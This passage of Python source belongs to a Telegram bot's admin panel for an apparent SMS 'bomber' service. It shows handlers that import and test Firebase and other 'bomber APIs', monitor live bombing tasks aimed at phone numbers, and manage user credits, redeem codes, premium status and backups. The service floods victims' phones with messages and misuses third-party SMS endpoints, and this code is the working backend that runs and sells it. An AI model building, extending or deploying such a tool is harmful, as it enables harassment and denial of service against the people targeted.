    added, skipped, failed = await add_firebase_urls(urls, ADMIN_ID)
    await update.message.reply_text(
        f"✅ Firebase URLs processed\n\n➕ Added: {added}\n⏭ Skipped: {skipped}\n❌ Failed: {failed}\n📡 Total bomber APIs: {len(BOMBER_APIS)}",
        reply_markup=get_firebase_manager_menu()
    )
    try:
        await log_admin_action(context, update.effective_user, "🔥 FIREBASE URL ADD", f"added={added} skipped={skipped}")
    except Exception:
        pass
    context.user_data["admin_state"] = None

async def process_firebase_add_txt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    text = ""
    if update.message.document:
        f = await context.bot.get_file(update.message.document.file_id)
        os.makedirs("backups", exist_ok=True)
        path = f"backups/fb_import_{update.message.document.file_unique_id}.txt"
        await f.download_to_drive(path)
        with open(path, "r", encoding="utf-8", errors="ignore") as fh:
            text = fh.read()
    else:
        text = update.message.text or ""
    urls = await parse_firebase_lines(text)
    if not urls:
        await update.message.reply_text("❌ No URLs in file/text.", reply_markup=get_firebase_manager_menu())
        context.user_data["admin_state"] = None
        return
    added, skipped, failed = await add_firebase_urls(urls, ADMIN_ID)
    await update.message.reply_text(
        f"✅ Firebase TXT processed\n\n➕ Added: {added}\n⏭ Skipped: {skipped}\n❌ Failed: {failed}\n📡 Total bomber APIs: {len(BOMBER_APIS)}",
        reply_markup=get_firebase_manager_menu()
    )
    try:
        await log_admin_action(context, update.effective_user, "🔥 FIREBASE TXT ADD", f"added={added}")
    except Exception:
        pass
    context.user_data["admin_state"] = None

async def admin_list_firebase(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    conn = await get_db()
    cursor = await conn.execute("SELECT id, name, url, is_active FROM apis ORDER BY id DESC")
    rows = await cursor.fetchall()
    fb = [r for r in rows if is_firebase_url(r[2]) or (r[1] or "").upper().startswith("FB_")]
    if not fb:
        await update.message.reply_text("📭 No Firebase APIs.", reply_markup=get_firebase_manager_menu())
        return
    text = f"🔥 **Firebase APIs** ({len(fb)})\n━━━━━━━━━━━━━━━━━━━\n\n"
    for r in fb[:40]:
        st = "🟢" if r[3] else "🔴"
        text += f"{st} `{r[0]}` {r[1][:20]}\n"
    if len(fb) > 40:
        text += f"\n... +{len(fb)-40} more"
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_firebase_manager_menu())

async def admin_test_firebase(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    await update.message.reply_text("🧪 Testing Firebase APIs...")
    conn = await get_db()
    cursor = await conn.execute("SELECT id, name, url, method, body FROM apis WHERE is_active = 1")
    rows = await cursor.fetchall()
    alive, dead = 0, 0
    for r in rows:
        if not (is_firebase_url(r[2]) or (r[1] or "").upper().startswith("FB_")):
            continue
        ok, status, _ = await test_firebase_api(r[2], r[3] or "POST", r[4])
        if ok:
            alive += 1
        else:
            dead += 1
        await asyncio.sleep(0.12)
    await update.message.reply_text(
        f"🧪 **Firebase Test**\n\n🟢 Alive: {alive}\n🔴 Dead: {dead}",
        parse_mode="Markdown",
        reply_markup=get_firebase_manager_menu()
    )

async def admin_remove_dead_firebase(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    await update.message.reply_text("⏳ Scanning & removing dead Firebase...")
    stats = await remove_dead_firebase()
    await update.message.reply_text(
        f"🔥 **Remove Dead Firebase**\n\nChecked: {stats['checked']}\n🟢 Alive: {stats['alive']}\n🔴 Deactivated: {stats['dead']}",
        parse_mode="Markdown",
        reply_markup=get_firebase_manager_menu()
    )
    try:
        await log_admin_action(context, update.effective_user, "🔥 REMOVE DEAD FIREBASE", str(stats))
    except Exception:
        pass

async def admin_keep_active_firebase(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    # First deactivate dead, then purge inactive firebase rows
    await update.message.reply_text("⏳ Keep Active Only: testing then purging inactive Firebase...")
    stats = await remove_dead_firebase()
    deleted = await keep_active_firebase_only()
    await update.message.reply_text(
        f"🔥 **Keep Active Firebase Only**\n\nChecked: {stats['checked']}\nAlive: {stats['alive']}\nDeactivated: {stats['dead']}\nDeleted inactive rows: {deleted}",
        parse_mode="Markdown",
        reply_markup=get_firebase_manager_menu()
    )


async def admin_daily_active_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Daily Active Users report from api_usage + users activity."""
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        conn = await get_db()
        # Users who appeared in api_usage today
        cursor = await conn.execute(
            """SELECT COUNT(DISTINCT user_id) FROM api_usage
               WHERE DATE(usage_time) = DATE('now') AND user_id > 0"""
        )
        dau_usage = (await cursor.fetchone())[0] or 0

        # Bombing tasks currently tracked as activity proxy
        active_bombers = len([uid for uid, t in BOMBING_TASKS.items() if t.get("active")])

        # Total users / premium / banned
        cursor = await conn.execute("SELECT COUNT(*) FROM users")
        total_users = (await cursor.fetchone())[0] or 0
        cursor = await conn.execute("SELECT COUNT(*) FROM users WHERE is_premium = 1")
        premium = (await cursor.fetchone())[0] or 0
        cursor = await conn.execute("SELECT COUNT(*) FROM users WHERE status = 'banned'")
        banned = (await cursor.fetchone())[0] or 0

        # Last 7 days distinct users from api_usage
        cursor = await conn.execute(
            """SELECT DATE(usage_time) as d, COUNT(DISTINCT user_id) as c
               FROM api_usage
               WHERE usage_time >= DATE('now', '-6 days') AND user_id > 0
               GROUP BY DATE(usage_time)
               ORDER BY d DESC"""
        )
        week = await cursor.fetchall()

        # Today's total API calls
        cursor = await conn.execute(
            "SELECT COUNT(*) FROM api_usage WHERE DATE(usage_time) = DATE('now')"
        )
        today_calls = (await cursor.fetchone())[0] or 0

        text = (
            f"📅 **Daily Active Users**\n"
            f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"{'━' * 20}\n\n"
            f"👤 DAU (today usage): `{dau_usage}`\n"
            f"💣 Active bombers now: `{active_bombers}`\n"
            f"📞 API calls today: `{today_calls}`\n\n"
            f"📊 **Totals**\n"
            f"├─ Users: `{total_users}`\n"
            f"├─ Premium: `{premium}`\n"
            f"└─ Banned: `{banned}`\n\n"
        )
        if week:
            text += "📈 **Last 7 days DAU**\n"
            for row in week:
                text += f"├─ {row[0]}: `{row[1]}`\n"
        else:
            text += "📈 Last 7 days: no usage rows yet\n"

        await update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_admin_main_menu())
    except Exception as e:
        logger.error(f"DAU error: {e}")
        await update.message.reply_text(f"❌ DAU error: {e}", reply_markup=get_admin_main_menu())

async def admin_monitor(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Live monitor: bombing tasks, APIs, bombing flag, backup, channels."""
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        conn = await get_db()
        cursor = await conn.execute("SELECT COUNT(*) FROM apis WHERE is_active = 1 AND api_type = 'bomber'")
        active_apis = (await cursor.fetchone())[0] or 0
        cursor = await conn.execute("SELECT COUNT(*) FROM apis WHERE is_active = 0")
        inactive_apis = (await cursor.fetchone())[0] or 0
        cursor = await conn.execute("SELECT COUNT(*) FROM apis")
        total_apis = (await cursor.fetchone())[0] or 0

        cursor = await conn.execute(
            "SELECT COUNT(*) FROM api_usage WHERE DATE(usage_time) = DATE('now')"
        )
        today_calls = (await cursor.fetchone())[0] or 0
        cursor = await conn.execute(
            "SELECT COUNT(*) FROM api_usage WHERE DATE(usage_time) = DATE('now') AND success = 1"
        )
        today_ok = (await cursor.fetchone())[0] or 0
        cursor = await conn.execute(
            "SELECT COUNT(*) FROM api_usage WHERE DATE(usage_time) = DATE('now') AND success = 0"
        )
        today_fail = (await cursor.fetchone())[0] or 0

        # Active bombing tasks detail
        bomb_lines = []
        for uid, task in list(BOMBING_TASKS.items()):
            if task.get("active"):
                bomb_lines.append(f"├─ User `{uid}` → `{task.get('number', '?')}` ({task.get('total', '?')} SMS)")
        bomb_block = "\n".join(bomb_lines) if bomb_lines else "├─ None"

        backup_on = get_setting("backup_enabled", "false") == "true"
        backup_hours = get_setting("backup_interval_hours", "6")
        sched_running = BACKUP_TASK is not None and not BACKUP_TASK.done()
        media_on = get_setting("welcome_media_enabled", "true") == "true"

        text = (
            f"📡 **MONITOR**\n"
            f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"{'━' * 20}\n\n"
            f"💣 Bombing global: {'🟢 ON' if BOMBING_ACTIVE else '🔴 OFF'}\n"
            f"🎯 Live tasks: `{len([1 for t in BOMBING_TASKS.values() if t.get('active')])}`\n"
            f"{bomb_block}\n\n"
            f"📡 **APIs**\n"
            f"├─ Active bomber: `{active_apis}`\n"
            f"├─ Inactive: `{inactive_apis}`\n"
            f"└─ Total: `{total_apis}`\n\n"
            f"📊 **Today calls**\n"
            f"├─ Total: `{today_calls}`\n"
            f"├─ ✅ {today_ok}\n"
            f"└─ ❌ {today_fail}\n\n"
            f"💾 Backup: {'🟢' if backup_on else '🔴'} every `{backup_hours}`h | Sched: {'🟢' if sched_running else '🔴'}\n"
            f"🎬 Welcome media: {'🟢' if media_on else '🔴'}\n"
            f"📢 Log CH: `{LOG_CHANNEL_ID or 'Not set'}`\n"
            f"💾 Backup CH: `{BACKUP_CHANNEL_ID or 'Not set'}`\n"
            f"📥 Loaded bomber APIs (RAM): `{len(BOMBER_APIS)}`"
        )
        await update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_admin_main_menu())
    except Exception as e:
        logger.error(f"Monitor error: {e}")
        await update.message.reply_text(f"❌ Monitor error: {e}", reply_markup=get_admin_main_menu())

async def admin_backup_now(update: Update, context: ContextTypes.DEFAULT_TYPE):


    if update.effective_user.id != ADMIN_ID:
        return
    await update.message.reply_text("⏳ Creating backup...")
    result = await run_backup_once(context, reason="manual")
    await update.message.reply_text(f"✅ Backup done: {result}", reply_markup=get_backup_manager_menu())
    try:
        await log_admin_action(context, update.effective_user, "💾 BACKUP NOW", result)
    except Exception:
        pass

async def admin_backup_enable(update: Update, context: ContextTypes.DEFAULT_TYPE, enable: bool):
    if update.effective_user.id != ADMIN_ID:
        return
    await update_setting("backup_enabled", "true" if enable else "false")
    state = "ENABLED ✅" if enable else "DISABLED ❌"
    await update.message.reply_text(f"💾 Auto Backup {state}", reply_markup=get_backup_manager_menu())
    if enable:
        await start_backup_scheduler(context.application)
    else:
        await stop_backup_scheduler()

async def admin_backup_set_interval(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    context.user_data["admin_state"] = "set_backup_interval"
    current = get_setting("backup_interval_hours", "6")
    await update.message.reply_text(
        f"⏰ **Set Backup Interval**\n\nCurrent: `{current}` hours\n\nSend number of hours (e.g. `6` or `0.5` for 30 min):",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )

async def admin_backup_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    enabled = get_setting("backup_enabled", "false")
    hours = get_setting("backup_interval_hours", "6")
    formats = get_setting("backup_formats", "sqlite,json")
    channel = BACKUP_CHANNEL_ID or LOG_CHANNEL_ID or "Not set"
    running = BACKUP_TASK is not None and not BACKUP_TASK.done()
    text = (
        f"📋 **Backup Status**\n━━━━━━━━━━━━━━━━━━━\n\n"
        f"Auto: {'🟢 ON' if enabled=='true' else '🔴 OFF'}\n"
        f"Interval: `{hours}` hours\n"
        f"Formats: `{formats}`\n"
        f"Channel: `{channel}`\n"
        f"Scheduler: {'🟢 Running' if running else '🔴 Stopped'}"
    )
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_backup_manager_menu())

async def admin_export_json(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    os.makedirs("backups", exist_ok=True)
    path = f"backups/manual_export_{ts}.json"
    await update.message.reply_text("⏳ Exporting JSON...")
    ok = await export_json_backup(path)
    if ok:
        with open(path, "rb") as f:
            await update.message.reply_document(document=f, caption="📄 JSON Export")
        await send_backup_to_channel(context, path, f"📄 Manual JSON Export\n{ts}")
        await update.message.reply_text("✅ JSON exported + sent to backup channel", reply_markup=get_backup_manager_menu())
    else:
        await update.message.reply_text("❌ JSON export failed", reply_markup=get_backup_manager_menu())

async def admin_export_sqlite(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    os.makedirs("backups", exist_ok=True)
    path = f"backups/manual_export_{ts}.db"
    await update.message.reply_text("⏳ Exporting SQLite...")
    ok = await export_sqlite_copy(path)
    if ok:
        with open(path, "rb") as f:
            await update.message.reply_document(document=f, caption="💾 SQLite Export")
        await send_backup_to_channel(context, path, f"💾 Manual SQLite Export\n{ts}")
        await update.message.reply_text("✅ SQLite exported + sent to backup channel", reply_markup=get_backup_manager_menu())
    else:
        await update.message.reply_text("❌ SQLite export failed", reply_markup=get_backup_manager_menu())

async def admin_import_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    context.user_data["admin_state"] = "import_db_file"
    await update.message.reply_text(
        "📥 **Import Database**\n\nSend a `.json` backup file (exported from this bot).\n\n⚠️ Only settings/apis/codes/media are restored safely.",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )

async def process_set_backup_interval(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        hours = float(update.message.text.strip())
        if hours < 0.25:
            await update.message.reply_text("❌ Minimum 0.25 hours (15 min)", reply_markup=get_back_keyboard())
            return
        await update_setting("backup_interval_hours", str(hours))
        await update.message.reply_text(f"✅ Interval set to `{hours}` hours", parse_mode="Markdown", reply_markup=get_backup_manager_menu())
        # restart scheduler with new interval
        if get_setting("backup_enabled", "false") == "true":
            await stop_backup_scheduler()
            await start_backup_scheduler(context.application)
    except ValueError:
        await update.message.reply_text("❌ Send a number (e.g. 6)", reply_markup=get_back_keyboard())
        return
    context.user_data["admin_state"] = None

async def process_import_db_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    doc = update.message.document
    if not doc:
        await update.message.reply_text("❌ Send a document file (.json)", reply_markup=get_back_keyboard())
        return
    file = await context.bot.get_file(doc.file_id)
    os.makedirs("backups", exist_ok=True)
    path = f"backups/import_{doc.file_unique_id}.json"
    await file.download_to_drive(path)
    result = await import_json_backup(path)
    await update.message.reply_text(f"📥 Import result:\n{result}", reply_markup=get_backup_manager_menu())
    try:
        await log_admin_action(context, update.effective_user, "📥 DB IMPORT", result)
    except Exception:
        pass
    context.user_data["admin_state"] = None

async def admin_restart_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):


    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ This command is admin only!")
        return
    
    await update.message.reply_text("🔄 **Restarting bot...**\n\n⏳ Please wait 10 seconds.", parse_mode="Markdown")
    
    global BOMBING_ACTIVE, BOMBING_TASKS
    BOMBING_ACTIVE = False
    for user_id in list(BOMBING_TASKS.keys()):
        if user_id in BOMBING_TASKS:
            BOMBING_TASKS[user_id]['active'] = False
    
    await asyncio.sleep(2)
    os.execv(sys.executable, [sys.executable] + sys.argv)

async def test_api(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    
    await update.message.reply_text(
        "🧪 **API Test**\n\nEnter test number:\nExample: `018XXXXXXXX`",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['admin_state'] = 'test_api_number'

async def test_api_number_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    
    number = update.message.text.strip()
    valid, msg = validate_phone(number)
    if not valid:
        await update.message.reply_text(f"❌ {msg}", reply_markup=get_back_keyboard())
        return
    
    context.user_data['test_number'] = number
    context.user_data['admin_state'] = 'test_api_message'
    await update.message.reply_text(
        "💬 **Enter test message:**\n\nType the message you want to send:",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )

async def test_api_message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    
    number = context.user_data.get('test_number')
    message = update.message.text
    
    if not number:
        await update.message.reply_text("❌ Error! Try again.", reply_markup=get_settings_menu())
        context.user_data.clear()
        return
    
    await update.message.reply_text(f"⏳ Testing...\n📱 {number}", parse_mode="Markdown")
    
    success, response = await send_sms_api(number, message)
    
    if success:
        await update.message.reply_text(
            f"✅ **API Test Successful!**\n\n📱 Number: `{number}`\n📡 Response: {response}",
            parse_mode="Markdown",
            reply_markup=get_settings_menu()
        )
    else:
        await update.message.reply_text(
            f"❌ **API Test Failed!**\n\n📱 Number: `{number}`\n⚠️ Error: {response}",
            parse_mode="Markdown",
            reply_markup=get_settings_menu()
        )
    
    context.user_data.clear()

# ===================== ADMIN STATE HANDLER =====================
async def admin_state_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    message = update.message.text
    state = context.user_data.get('admin_state')
    
    if state == 'add_credit':
        try:
            parts = message.split()
            if len(parts) != 2:
                await update.message.reply_text("❌ Invalid format! Use: `ID AMOUNT`", parse_mode="Markdown")
                return
            
            target_id = int(parts[0])
            amount = int(parts[1])
            conn = await get_db()
            await conn.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, target_id))
            await conn.commit()
            await admin_log(user_id, "Added Credit", target_id, f"{amount} credits")

            # ===== PRIVATE LOG: Credit added =====
            try:
                admin = update.effective_user
                await log_admin_action(
                    context,
                    admin,
                    "🟢 CREDIT ADDED",
                    f"Target User ID: <code>{target_id}</code>\n"
                    f"Amount: +{amount} credits"
                )
            except Exception as e:
                logger.error(f"Add credit log error: {e}")

            await update.message.reply_text(f"✅ Added `{amount}` credits to user `{target_id}`!", parse_mode="Markdown", reply_markup=get_management_menu())
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
        context.user_data['admin_state'] = None
        return
    
    if state == 'remove_credit':
        try:
            parts = message.split()
            if len(parts) != 2:
                await update.message.reply_text("❌ Invalid format! Use: `ID AMOUNT`", parse_mode="Markdown")
                return
            
            target_id = int(parts[0])
            amount = int(parts[1])
            conn = await get_db()
            await conn.execute("UPDATE users SET balance = balance - ? WHERE user_id = ?", (amount, target_id))
            await conn.commit()
            await admin_log(user_id, "Removed Credit", target_id, f"{amount} credits")

            # ===== PRIVATE LOG: Credit removed =====
            try:
                admin = update.effective_user
                await log_admin_action(
                    context,
                    admin,
                    "🔴 CREDIT REMOVED",
                    f"Target User ID: <code>{target_id}</code>\n"
                    f"Amount: -{amount} credits"
                )
            except Exception as e:
                logger.error(f"Remove credit log error: {e}")

            await update.message.reply_text(f"✅ Removed `{amount}` credits from user `{target_id}`!", parse_mode="Markdown", reply_markup=get_management_menu())
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
        context.user_data['admin_state'] = None
        return
    
    if state == 'broadcast':
        broadcast_text = message
        conn = await get_db()
        cursor = await conn.execute("SELECT user_id FROM users WHERE status = 'active'")
        users = await cursor.fetchall()
        
        await update.message.reply_text(f"⏳ Broadcasting to {len(users)} users...")
        success = 0
        for user in users:
            try:
                await context.bot.send_message(user[0], f"📢 **Admin Broadcast**\n\n{broadcast_text}", parse_mode='Markdown')
                success += 1
                await asyncio.sleep(0.05)
            except:
                pass
        await admin_log(user_id, "Broadcast", None, f"Sent to {success} users")
        await update.message.reply_text(f"✅ Broadcast completed to {success} users!", reply_markup=get_campaign_menu())
        context.user_data['admin_state'] = None
        return
    
    if state == 'create_code':
        try:
            parts = message.split()
            if len(parts) != 3:
                await update.message.reply_text("❌ Invalid format! Use: `CODE AMOUNT USAGES`", parse_mode="Markdown")
                return
            
            code = parts[0].upper()
            amount = int(parts[1])
            usages = int(parts[2])
            conn = await get_db()
            
            cursor = await conn.execute("SELECT 1 FROM redeem_codes WHERE code = ?", (code,))
            if await cursor.fetchone():
                await update.message.reply_text(f"❌ Code `{code}` already exists!", parse_mode="Markdown")
                return
            
            await conn.execute("INSERT INTO redeem_codes (code, amount, usages, created_by) VALUES (?, ?, ?, ?)", (code, amount, usages, user_id))
            await conn.commit()
            await admin_log(user_id, "Created Code", None, f"{code}: {amount}x{usages}")
            await update.message.reply_text(f"✅ **Code Created!**\n\n🎟️ Code: `{code}`\n💰 Amount: {amount} credits\n👥 Usages: {usages} times", parse_mode="Markdown", reply_markup=get_campaign_menu())
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
        context.user_data['admin_state'] = None
        return
    
    if state == 'daily_bonus_control':
        try:
            parts = message.split()
            cmd = parts[0].upper() if parts else ""
            
            if cmd == 'ON':
                await update_setting("daily_bonus_enabled", "true")
                await update.message.reply_text("✅ Daily bonus enabled!", reply_markup=get_admin_main_menu())
            elif cmd == 'OFF':
                await update_setting("daily_bonus_enabled", "false")
                await update.message.reply_text("❌ Daily bonus disabled!", reply_markup=get_admin_main_menu())
            elif cmd == 'AMOUNT' and len(parts) >= 2:
                await update_setting("daily_bonus_amount", parts[1])
                await update.message.reply_text(f"💰 Daily bonus set to `{parts[1]}` credits!", parse_mode="Markdown", reply_markup=get_admin_main_menu())
            elif cmd == 'COOLDOWN' and len(parts) >= 2:
                await update_setting("daily_bonus_cooldown", parts[1])
                await update.message.reply_text(f"⏰ Cooldown set to `{parts[1]}` hours!", parse_mode="Markdown", reply_markup=get_admin_main_menu())
            else:
                await update.message.reply_text("❌ **Invalid command!**\n\n✅ `ON` - Enable\n✅ `OFF` - Disable\n✅ `AMOUNT 10` - Change bonus\n✅ `COOLDOWN 12` - Change cooldown", parse_mode="Markdown")
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
        context.user_data['admin_state'] = None
        return
    
    if state == 'redeem_control':
        try:
            parts = message.split()
            cmd = parts[0].upper() if parts else ""
            conn = await get_db()
            
            if cmd == 'CREATE' and len(parts) >= 4:
                code = parts[1].upper()
                amount = int(parts[2])
                usages = int(parts[3])
                
                cursor = await conn.execute("SELECT 1 FROM redeem_codes WHERE code = ?", (code,))
                if await cursor.fetchone():
                    await update.message.reply_text(f"❌ Code `{code}` already exists!", parse_mode="Markdown")
                    return
                
                await conn.execute("INSERT INTO redeem_codes (code, amount, usages, created_by) VALUES (?, ?, ?, ?)", (code, amount, usages, user_id))
                await conn.commit()
                await admin_log(user_id, "Created Code", None, f"{code}")
                await update.message.reply_text(f"✅ Code `{code}` created! (💰{amount})", parse_mode="Markdown", reply_markup=get_admin_main_menu())
            
            elif cmd == 'DELETE' and len(parts) >= 2:
                if parts[1].upper() == 'ALL':
                    await conn.execute("DELETE FROM redeem_codes")
                    await conn.commit()
                    await update.message.reply_text("🗑️ All codes deleted!", reply_markup=get_admin_main_menu())
                else:
                    code = parts[1].upper()
                    await conn.execute("DELETE FROM redeem_codes WHERE code = ?", (code,))
                    await conn.commit()
                    await update.message.reply_text(f"🗑️ Code `{code}` deleted!", parse_mode="Markdown", reply_markup=get_admin_main_menu())
            
            elif cmd == 'EDIT' and len(parts) >= 4:
                code = parts[1].upper()
                new_amount = int(parts[2])
                new_usages = int(parts[3])
                
                cursor = await conn.execute("SELECT 1 FROM redeem_codes WHERE code = ?", (code,))
                if not await cursor.fetchone():
                    await update.message.reply_text(f"❌ Code `{code}` not found!", parse_mode="Markdown")
                    return
                
                await conn.execute("UPDATE redeem_codes SET amount = ?, usages = ? WHERE code = ?", (new_amount, new_usages, code))
                await conn.commit()
                await update.message.reply_text(f"✅ Code `{code}` updated! (💰{new_amount})", parse_mode="Markdown", reply_markup=get_admin_main_menu())
            
            elif cmd == 'LIST':
                cursor = await conn.execute("SELECT code, amount, usages FROM redeem_codes ORDER BY created_at DESC")
                all_codes = await cursor.fetchall()
                if all_codes:
                    response = "🎟️ **All Redeem Codes**\n━━━━━━━━━━━━━━━━━━━\n\n"
                    for code in all_codes:
                        status = "✅" if code[2] > 0 else "❌"
                        response += f"{status} `{code[0]}` → 💰{code[1]} (Remaining: {code[2]})\n"
                    await update.message.reply_text(response, parse_mode="Markdown", reply_markup=get_admin_main_menu())
                else:
                    await update.message.reply_text("📭 No codes found!", reply_markup=get_admin_main_menu())
            else:
                await update.message.reply_text("❌ **Invalid command!**\n\n✅ `CREATE CODE AMOUNT USAGES`\n✅ `DELETE CODE`\n✅ `DELETE ALL`\n✅ `EDIT CODE NEW_AMOUNT NEW_USAGES`\n✅ `LIST`", parse_mode="Markdown")
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
        context.user_data['admin_state'] = None
        return
    
    if state == 'balance_control':
        try:
            parts = message.split()
            cmd = parts[0].upper() if parts else ""
            conn = await get_db()
            
            if cmd == 'GIFT' and len(parts) >= 3:
                target = parts[1].upper()
                amount = int(parts[2])
                
                if target == 'ALL':
                    await conn.execute("UPDATE users SET balance = balance + ?", (amount,))
                    await conn.commit()
                    cursor = await conn.execute("SELECT COUNT(*) FROM users")
                    count = await cursor.fetchone()

                    # ===== PRIVATE LOG: Gift all =====
                    try:
                        admin = update.effective_user
                        await log_admin_action(
                            context,
                            admin,
                            "🎁 GIFT ALL USERS",
                            f"Amount: +{amount} credits\n"
                            f"Users affected: {count[0]}"
                        )
                    except Exception as e:
                        logger.error(f"Gift all log error: {e}")

                    await update.message.reply_text(f"🎁 Gifted `{amount}` credits to {count[0]} users!", parse_mode="Markdown", reply_markup=get_admin_main_menu())
                else:
                    target_id = int(target)
                    await conn.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, target_id))
                    await conn.commit()
                    await update.message.reply_text(f"✅ Gifted `{amount}` credits to user `{target_id}`!", parse_mode="Markdown", reply_markup=get_admin_main_menu())
            
            elif cmd == 'SET' and len(parts) >= 3:
                target_id = int(parts[1])
                amount = int(parts[2])
                await conn.execute("UPDATE users SET balance = ? WHERE user_id = ?", (amount, target_id))
                await conn.commit()
                await update.message.reply_text(f"✅ Set user `{target_id}` balance to `{amount}`!", parse_mode="Markdown", reply_markup=get_admin_main_menu())
            
            elif cmd == 'RESET' and len(parts) >= 2 and parts[1].upper() == 'ALL':
                await conn.execute("UPDATE users SET balance = 0")
                await conn.commit()
                await update.message.reply_text("🔄 Reset all user balances to 0!", reply_markup=get_admin_main_menu())
            
            elif cmd == 'REPORT':
                cursor = await conn.execute("SELECT SUM(balance), AVG(balance), MAX(balance), MIN(balance), COUNT(*) FROM users")
                stats = await cursor.fetchone()
                await update.message.reply_text(
                    f"📊 **Balance Report**\n\n"
                    f"👥 Total Users: `{stats[4]}`\n"
                    f"💰 Total Balance: `{stats[0] or 0}`\n"
                    f"📊 Average: `{round(stats[1] or 0, 2)}`\n"
                    f"📈 Max: `{stats[2]}`\n"
                    f"📉 Min: `{stats[3]}`",
                    parse_mode="Markdown",
                    reply_markup=get_admin_main_menu()
                )
            else:
                await update.message.reply_text("❌ **Invalid command!**\n\n✅ `GIFT ALL AMOUNT`\n✅ `GIFT USER_ID AMOUNT`\n✅ `SET USER_ID AMOUNT`\n✅ `RESET ALL`\n✅ `REPORT`", parse_mode="Markdown")
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
        context.user_data['admin_state'] = None
        return
    
    if state == 'user_control':
        try:
            parts = message.split()
            cmd = parts[0].upper() if parts else ""
            conn = await get_db()
            
            if cmd == 'BLOCK' and len(parts) >= 2:
                target_id = int(parts[1])
                await conn.execute("UPDATE users SET status = 'banned' WHERE user_id = ?", (target_id,))
                await conn.commit()
                await update.message.reply_text(f"🚫 User `{target_id}` blocked!", parse_mode="Markdown", reply_markup=get_admin_main_menu())
            
            elif cmd == 'UNBLOCK' and len(parts) >= 2:
                target_id = int(parts[1])
                await conn.execute("UPDATE users SET status = 'active' WHERE user_id = ?", (target_id,))
                await conn.commit()
                await update.message.reply_text(f"✅ User `{target_id}` unblocked!", parse_mode="Markdown", reply_markup=get_admin_main_menu())
            
            elif cmd == 'INFO' and len(parts) >= 2:
                target_id = int(parts[1])
                cursor = await conn.execute("SELECT username, balance, total_sms, total_bombing, total_bulk, status, is_premium, premium_expiry FROM users WHERE user_id = ?", (target_id,))
                row = await cursor.fetchone()
                if row:
                    is_prem = row[6] == 1 and not is_premium_expired(row[7])
                    await update.message.reply_text(
                        f"👤 **User Info**\n\n"
                        f"🆔 ID: `{target_id}`\n"
                        f"👤 Username: {row[0] or 'N/A'}\n"
                        f"💰 Balance: `{row[1]}`\n"
                        f"📨 SMS: `{row[2]}`\n"
                        f"💣 Bomber: `{row[3]}`\n"
                        f"📤 Bulk: `{row[4]}`\n"
                        f"🚦 Status: {row[5]}\n"
                        f"👑 Premium: {'✅' if is_prem else '❌'}",
                        parse_mode="Markdown",
                        reply_markup=get_admin_main_menu()
                    )
                else:
                    await update.message.reply_text(f"❌ User `{target_id}` not found!", parse_mode="Markdown")
            
            elif cmd == 'LIST' and len(parts) >= 2 and parts[1].upper() == 'USERS':
                cursor = await conn.execute("SELECT COUNT(*) FROM users")
                total = await cursor.fetchone()
                cursor = await conn.execute("SELECT COUNT(*) FROM users WHERE status = 'banned'")
                banned = await cursor.fetchone()
                cursor = await conn.execute("SELECT COUNT(*) FROM users WHERE is_premium = 1")
                premium = await cursor.fetchone()
                await update.message.reply_text(
                    f"👥 **User Statistics**\n\n"
                    f"📊 Total: `{total[0]}`\n"
                    f"👑 Premium: `{premium[0]}`\n"
                    f"🚫 Banned: `{banned[0]}`",
                    parse_mode="Markdown",
                    reply_markup=get_admin_main_menu()
                )
            
